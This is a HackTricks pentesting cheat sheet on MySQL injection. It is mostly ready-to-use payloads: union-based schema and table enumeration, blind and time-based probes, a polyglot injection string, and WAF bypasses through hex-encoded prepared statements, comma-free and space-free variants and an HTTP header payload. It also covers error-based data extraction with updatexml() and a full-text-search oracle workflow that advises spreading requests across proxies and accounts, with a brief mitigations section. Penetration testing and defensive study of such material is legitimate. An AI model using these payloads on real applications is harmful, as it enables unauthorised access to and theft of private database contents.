---
title: "MySQL injection"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/sql-injection/mysql-injection/index.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## Comments

```
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## Interesting Functions

### Confirm Mysql:

```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### Useful functions

```
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),lpad(),rpad(),left(),right(),instr(),sleep()
```
## All injection

```
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
from [https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/](https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/)[\[7\]](#references)

## Flow

Remember that in “modern” versions of **MySQL** you can substitute “***information_schema.tables***” for “**mysql.innodb_table_stats****”** (This could be useful to bypass WAFs).

```
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **Only 1 value**

**Only 1 value**

- `group_concat()`
- `Limit X,1`

### **Blind one by one**

**Blind one by one**

- `substr(version(),X,1)='r'` or`substring(version(),X,1)=0x70` or`ascii(substr(version(),X,1))=112`
- `mid(version(),X,1)='5'`

### **Blind adding**

**Blind adding**

- `LPAD(version(),1...length(version()),'1')='asd'...`
- `RPAD(version(),1...length(version()),'1')='asd'...`
- `SELECT RIGHT(version(),1...length(version()))='asd'...`
- `SELECT LEFT(version(),1...length(version()))='asd'...`
- `SELECT INSTR('foobarbar', 'fo...')=1`

## Detect number of columns

Using a simple ORDER

```
order by 1
order by 2
order by 3
...
order by XXX
UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
## MySQL Union Based

```
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**Learn here different options to** **abuse a Mysql injection to obtain a SSRF****.**

## WAF bypass tricks

### Executing queries through Prepared Statements

When stacked queries are allowed, it might be possible to bypass WAFs by assigning to a variable the hex representation of the query you want to execute (by using SET), and then use the PREPARE and EXECUTE MySQL statements to ultimately execute the query. Something like this:

```
0); SET @query = 0x53454c45435420534c454550283129; PREPARE stmt FROM @query; EXECUTE stmt; #
```
For more information please refer to [this blog post](https://karmainsecurity.com/impresscms-from-unauthenticated-sqli-to-rce).[\[8\]](#references)

### Information_schema alternatives

Remember that in “modern” versions of **MySQL** you can substitute ***information_schema.tables*** for ***mysql.innodb_table_stats*** or for ***sys.x$schema_flattened_keys*** or for **sys.schema_table_statistics**

### MySQLinjection without COMMAS

Select 2 columns without using any comma ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):[\[9\]](#references)

```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### Retrieving values without the column name

If at some point you know the name of the table but you don’t know the name of the columns inside the table, you can try to find how may columns are there executing something like:

```
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:

```
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
More info in [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)[\[10\]](#references)

### Injection without SPACES (`/**/` comment trick)

`/**/` comment trick)
Some applications sanitise or parse user input with functions such as `sscanf("%128s", buf)` which **stop at the first space character**.

Because MySQL treats the sequence `/**/` as a comment *and* as whitespace, it can be used to completely remove normal spaces from the payload while keeping the query syntactically valid.[\[1\]](#references)

Example time-based blind injection bypassing the space filter:

```
GET /api/fabric/device/status HTTP/1.1
Authorization: Bearer AAAAAA'/**/OR/**/SLEEP(5)--/**/-'
```
Which the database receives as:

```
' OR SLEEP(5)-- -'
```
This is especially handy when:

- The controllable buffer is restricted in size (e.g. `%128s` ) and spaces would prematurely terminate the input.
- Injecting through HTTP headers or other fields where normal spaces are stripped or used as separators.
- Combined with `INTO OUTFILE` primitives to achieve full pre-auth RCE (see the MySQL File RCE section).

### MySQL history

You ca see other executions inside the MySQL reading the table: **sys.x$statement_analysis**

### Version alternative**s**

**s**

```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```
## MySQL Full-Text Search (FTS) BOOLEAN MODE operator abuse (WOR)

This is not a classic SQL injection. When developers pass user input into `MATCH(col) AGAINST('...' IN BOOLEAN MODE)`, MySQL executes a rich set of Boolean search operators inside the quoted string. Many WAF/SAST rules only focus on quote breaking and miss this surface.[\[5\]](#references)

Key points:

- Operators are evaluated inside the quotes: `+` (must include),`-` (must not include),`*` (trailing wildcard),`"..."` (exact phrase),`()` (grouping),`<` /`>` /`~` (weights). See MySQL docs.<sup>[\[2\]](#references)[\[3\]](#references)</sup>
- This allows presence/absence and prefix tests without breaking out of the string literal, e.g. `AGAINST('+admin*' IN BOOLEAN MODE)` to check for any term starting with`admin` .
- Useful to build oracles such as “does any row contain a term with prefix X?” and to enumerate hidden strings via prefix expansion.

Example query built by the backend:

```
SELECT tid, firstpost
FROM threads
WHERE MATCH(subject) AGAINST('+jack*' IN BOOLEAN MODE);
```
If the application returns different responses depending on whether the result set is empty (e.g., redirect vs. error message), that behavior becomes a Boolean oracle that can be used to enumerate private data such as hidden/deleted titles.

Sanitizer bypass patterns (generic):

- Boundary-trim preserving wildcard: if the backend trims 1–2 trailing characters per word via a regex like `(\b.{1,2})(\s)|(\b.{1,2}$)` , submit`prefix*ZZ` . The cleaner trims the`ZZ` but leaves the`*` , so`prefix*` survives.
- Early-break stripping: if the code strips operators per word but stops processing when it finds any token with length ≥ min length, send two tokens: the first is a junk token that meets the length threshold, the second carries the operator payload. For example: `&&&&& +jack*ZZ` → after cleaning:`+&&&&& +jack*` .

Payload template (URL-encoded):

```
keywords=%26%26%26%26%26+%2B{FUZZ}*xD
```
- `%26` is`&` ,`%2B` is`+` . The trailing`xD` (or any two letters) is trimmed by the cleaner, preserving`{FUZZ}*` .
- Treat a redirect as “match” and an error page as “no match”. Don’t auto-follow redirects to keep the oracle observable.

Enumeration workflow:

1. Start with `{FUZZ} = a…z,0…9` to find first-letter matches via`+a*` ,`+b*` , …
2. For each positive prefix, branch: `a* → aa* / ab* / …` . Repeat to recover the whole string.
3. Distribute requests (proxies, multiple accounts) if the app enforces flood control.

Why titles often leak while contents don’t:

- Some apps apply visibility checks only after a preliminary MATCH on titles/subjects. If control-flow depends on the “any results?” outcome before filtering, existence leaks occur.

Mitigations:

- If you don’t need Boolean logic, use `IN NATURAL LANGUAGE MODE` or treat user input as a literal (escape/quote disables operators in other modes).
- If Boolean mode is required, strip or neutralize all Boolean operators (`+ - * " ( ) < > ~` ) for every token (no early breaks) after tokenization.
- Apply visibility/authorization filters before MATCH, or unify responses (constant timing/status) when the result set is empty vs. non-empty.
- Review analogous features in other DBMS: PostgreSQL `to_tsquery` /`websearch_to_tsquery` , SQL Server/Oracle/Db2`CONTAINS` also parse operators inside quoted arguments.

Notes:

- Prepared statements do not protect against semantic abuse of `REGEXP` or search operators. An input like`.*` remains a permissive regex even inside a quoted`REGEXP '.*'` . Use allow-lists or explicit guards.<sup>[\[4\]](#references)</sup>

## Error-based exfiltration via `updatexml()`

`updatexml()`
When the application only returns SQL errors (not raw result sets), you can leak data through MySQL error strings:

```
dimension: id {
  type: number
  sql: updatexml(null, concat(0x7e, IFNULL((SELECT name FROM project_state LIMIT 1 OFFSET 0), 'NULL'), 0x7e, '///'), null) ;;
}
```
`updatexml()` raises an XPATH error that embeds the concatenated string, so the value from the inner `SELECT` appears in the error response between delimiters (`0x7e` = `~`). Iterate `LIMIT 1 OFFSET N` to enumerate rows. This works even when the UI forces “boolean” tests because the error message is still surfaced.[\[6\]](#references)

## Other MYSQL injection guides

## References
